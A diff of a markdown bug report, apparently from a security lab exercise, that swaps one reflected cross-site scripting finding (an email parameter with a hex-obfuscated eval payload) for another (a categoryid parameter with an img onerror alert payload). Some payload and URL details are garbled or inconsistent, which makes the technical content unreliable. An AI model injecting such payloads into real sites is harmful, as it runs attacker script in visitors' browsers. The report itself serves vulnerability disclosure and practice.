@@ -1,5 +1,3 @@
-## Title
-
  Reflected Cross-Site Scripting (XSS) via search Parameter on Help Center Page
 
 ## Vulnerability Type
@@ -7,32 +5,32 @@
 Reflected XSS
 
 ## Summary : 
-In http://kzlabs.com/punishment/23.php email paramter is vulnerable to reflected XSS . website reflects the User input from search paramter . which leads attacker to add malecious javascript code within victims browser when user visit malecious url . 
+http://kzlabs.com/punishment/19.php categoryid parameter is vulnerable to reflected XSS . website reflects the User input from search paramter . which leads attacker to add malecious javascript code within victims browser when user visit malecious url . 
 
 ## Vulnerable Endpoint
-http://kzlabs.com/punishment/23.php?email=
-
+http://kzlabs.com/punishment/19.php?=categoryid
 ## Steps to Reproduce : 
 
-1. Navigate to the following URL : ```http://kzlabs.com/punishment/23.php?email=%3CImg%20src=x%20onerror=%22eval(%27\x61\x6c\x65\x72\x74(1)%27)%22%3E```
+1. Navigate to the following URL : ```http://kzlabs.com/punishment/19.php?categoryid=%3Cimg%20src=x%20onerror=%22aalertlert(1)%22%3E```
 2. Observe that a JavaScript alert box pops up displaying `1` — confirming that the script executed.
    
 
 
 ## Payload Used
 
-```<Img src=x onerror="eval('\x61\x6c\x65\x72\x74(1)')">```
+```<img src=x oneerror="alert(1)">``
 
 ## Proof of Concept Request
   ```Screemshot 1 : ``` TThe Report Shows Payload add in search bar . Location where payload should be insert. 
- <img width="1920" height="1080" alt="Screenshot From 2026-05-25 22-15-42" src="https://github.com/user-attachments/assets/c891e9fe-18c2-420c-854f-29960b49a6f9" />
+  <img width="1920" height="1080" alt="Screenshot From 2026-05-25 21-54-19" src="https://github.com/user-attachments/assets/0e0cfe29-b309-451e-904b-e886de29731c" />
 
+ 
 
  ```Screenshot 2 : ``` The Report Shows Successfully the Payload has worked and Pop up Box get Fired.
  
  
-<img width="1920" height="1080" alt="Screenshot From 2026-05-25 22-15-49" src="https://github.com/user-attachments/assets/4ea540bf-d8f2-4b89-af43-88fa00496998" />
 
+<img width="1920" height="1080" alt="Screenshot From 2026-05-25 21-54-25" src="https://github.com/user-attachments/assets/f359443b-3d79-41d1-87a1-7315b6e19c77" />
 
 
 ## Impact
